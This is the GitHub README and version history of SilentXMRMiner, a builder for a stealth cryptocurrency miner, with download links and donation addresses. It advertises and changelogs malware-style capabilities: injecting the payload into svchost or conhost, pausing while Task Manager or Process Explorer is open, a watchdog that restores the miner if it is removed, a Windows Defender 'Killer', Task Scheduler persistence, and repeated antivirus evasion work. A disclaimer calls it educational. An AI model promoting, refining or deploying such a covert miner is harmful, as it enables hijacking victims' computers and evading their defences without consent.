
<img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">

# SilentXMRMiner v1.3 - Based on Lime Miner v0.3

Can mine all the following algorithms and thus all the cryptocurrencies that use them: **cn/upx2**, **argon2/chukwav2**, **cn/ccx**, **kawpow**, **rx/keva**, **astrobwt**, **cn-pico/tlo**, **rx/sfx**, **rx/arq**, **rx/0**, **argon2/chukwa**, **argon2/wrkz**, **rx/wow**, **cn/fast**, **cn/rwz**, **cn/zls**, **cn/double**, **cn/r**, **cn-pico**, **cn/half**, **cn/2**, **cn/xao**, **cn/rto**, **cn-heavy/tube**, **cn-heavy/xhv**, **cn-heavy/0**, **cn/1**, **cn-lite/1**, **cn-lite/0** and **cn/0**.

## Main Features

* .NET - Coded in Visual Basic .NET, requires .NET Framework 4.5.
 
* Codedom - No need for external libraries to compile

* Injection (Silent) - Hide payload behind another process

* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)

* Idle Mining - Can be configured to mine with a different Max CPU when computer is idle
  
* Stealth - Pauses the miner while Task Manager, Process Hacker or Process Explorer is open

* Watchdog - Replaces the miner if removed and starts it if closed down

* Remote Configuration - Can get the connection settings remotely from a URL at each startup

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentXMRMiner/releases

## My Other Miners

[Silent ETH (Ethereum) Miner](https://github.com/UnamSanctam/SilentETHMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/wiki) or at the top of the page.

## Changes

### v1.3 (07/05/2021)
* Updated miner
* Added a Remote Configuration feature that can get the connection settings remotely from a URL at each startup
* Added option to auto-create an uninstaller for the miner
* Added Windows Defender "Killer"
* Added option to run as administrator
* Updated CUDA version to 11 to better support newer RTX cards
* Reworked whole program flow to bypass file scan detections
* Added link to wiki in builder for quicker access
* Added better DEBUG messaging
* Changed command line option prefixes
* Fixed old limitations
* Fixed bugs
### v1.2.3 (10/04/2021)
* Fixed watchdog temporary path
* Updated injector
* Readded injector options svchost.exe and conhost.exe
* Decreased injector detections
* Improved error handling
### v1.2.2 (09/04/2021)
* Fixed crash when some connections are blocked by the government/ISP in places like Turkey or China
### v1.2.1 (09/04/2021)
* Fixed minor injection option bug
### v1.2 (09/04/2021)
* Fixed critial bug on some Windows systems
* Added Task Scheduler startup when miner has administrator privileges
* Replaced and improved injector
* Added advanced options form
* Added debug option to display errors for testing
* Added ability to obfuscate watchdog
* Fixed miscellaneous bugs
### v1.1 (31/03/2021)
* Updated miner
* Improved miner performance
* Recoded injector and watchdog from VB to C#
* Decreased antivirus detections
* Added built-in function name obfuscation
* Added Process Hacker and Process Explorer to stealth targets
### v1.0.3 (27/03/2021)
* Updated Watchdog
* Improved injector workflow reliability
* Changed encryption since the code was detected
### v1.0.2 (19/03/2021)
* Added 0% Max CPU option
* Increased salt lengths
* Improved Watchdog implementation
* Improved persistance
### v1.0.1 (14/03/2021)
* Removed some injection options due to new Windows protections
### v1.0 (12/03/2021)
* Updated miner
* Decreased antivirus detections
* Added a watchdog that replaces the miner if removed and starts it if closed down
* Added anti-sleep
* Stopped the command window from showing briefly when started
* Fixed bugs
### v0.9 (02/02/2021)
* Updated miner
* Greatly decreased antivirus detections
* Idle Max CPU, added customizable Max CPU usage while the miner is idle
* Idle Wait, added customizable time to wait before the miner is idle
* Stealth, currently pauses the miner while Task Manager is open
* Start Delay, added a customizable start delay before the miner is injected and starts, decreases detection by a lot
* Hide file, can now choose to hide the copied miner file when "Install" is enabled
* Now hides the library folder
* Encrypted all strings
### v0.8.1 (07/01/2021)
* Improved AV bypass
* Reverted back to .NET Framework 4.5
* Fixed bug that stopped miner from injecting
* Improved file size
* Fixed incorrect scaling with some system languages
### v0.8 (04/01/2021)
* Updated miner
* Fixed bugs
* Lowered requirement to .NET 4.0
* Added SSL/TLS option
* Added custom parameter option
* Increased miner performance
### v0.7.1 (09/10/2020)
* Fixed a bug
### v0.7 (08/10/2020)
* Updated miner
* Added help tooltips to clarify options
* Fixed bugs
* Reworked some code
### v0.6 (21/04/2020)
* Updated miner
* Added custom Idle option to miner (Starts mining after 15 minutes of inactivity and stops when active again)
* Added more options in the builder (Enable/Disable CPU, Nicehash and Idle mining)
* Fixed driver paths
* Reworked some code
### v0.5 (09/04/2020)
* Updated miner
* Massively improved file size by compressing libraries
### v0.4 (18/12/2019)
* Updated miner
* Improvement to non-GPU enabled filesize
### v0.3 (10/12/2019)
* Updated to work with the new Monero fork
* Added toggle to enable/disable GPU mining
### v0.2 (05/08/2019)
* Added more injection process choices
* Added Max CPU choice
### v0.1 (03/08/2019)
* Inital release

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 

## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

CHAIN: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3